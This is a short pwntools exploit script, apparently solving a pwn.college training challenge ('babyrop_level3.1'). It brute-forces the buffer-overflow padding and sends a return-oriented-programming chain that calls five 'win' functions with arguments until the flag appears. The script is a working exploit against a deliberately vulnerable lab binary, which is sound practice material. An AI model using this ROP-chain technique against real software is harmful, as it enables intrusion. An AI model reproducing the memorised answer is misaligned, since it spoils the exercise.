from pwn import *

pop = p64(0x402273)

win1 = p64(0x0040203d)
win2 = p64(0x00401cb2)
win3 = p64(0x00401e78)
win4 = p64(0x00401d92)
win5 = p64(0x00401f5a)

arg1 = p64(1)
arg2 = p64(2)
arg3 = p64(3)
arg4 = p64(4)
arg5 = p64(5)
i=44
while True:
    payload = b"A"*i
    payload+=pop+arg1+win1+pop+arg2+win2+pop+arg3+win3+pop+arg4+win4+pop+arg5+win5
    p = process('/challenge/./babyrop_level3.1')
#p=gdb.debug('/challenge/./babyrop_level3.0',gdbscript='b *0x00000000004025ae')
    p.recvuntil('###\n\n')
    p.sendline(payload)
#p.interactive()
    recv = p.recvall()
    if(b'pwn.college' in recv):
        print(recv)
        break
    i+=1